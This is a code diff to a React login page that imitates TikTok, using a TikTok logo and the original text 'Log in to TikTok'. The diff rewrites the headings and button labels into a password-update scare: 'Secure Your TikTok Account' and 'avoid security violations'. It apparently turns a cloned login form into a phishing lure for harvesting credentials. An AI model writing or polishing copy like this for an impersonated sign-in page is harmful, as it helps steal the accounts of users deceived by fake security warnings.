@@ -24,11 +24,11 @@ export default function LoginPage() {
         <div className="text-center space-y-3">
           <TikTokLogo className="mx-auto" />
           <h1 className="text-3xl font-bold text-foreground" data-testid="heading-login">
-            Log in to TikTok
+            Secure Your TikTok Account
           </h1>
           {method === "select" && (
             <p className="text-sm text-muted-foreground" data-testid="text-description">
-              Manage your account, check notifications, comment on videos, and more.
+              Update your password to protect your account and avoid security violations.
             </p>
           )}
         </div>
@@ -43,7 +43,7 @@ export default function LoginPage() {
                 data-testid="button-select-phone-email-username"
               >
                 <Smartphone className="w-5 h-5" />
-                Use phone / email / username
+                Update password with phone / email / username
               </Button>
             </>
           )}
@@ -60,7 +60,7 @@ export default function LoginPage() {
                 >
                   <X className="w-5 h-5" />
                 </Button>
-                <h2 className="text-xl font-semibold" data-testid="heading-login-phone">Log in</h2>
+                <h2 className="text-xl font-semibold" data-testid="heading-login-phone">Update Your Password</h2>
               </div>
 
               <div className="flex gap-2 p-1 bg-muted rounded-md">
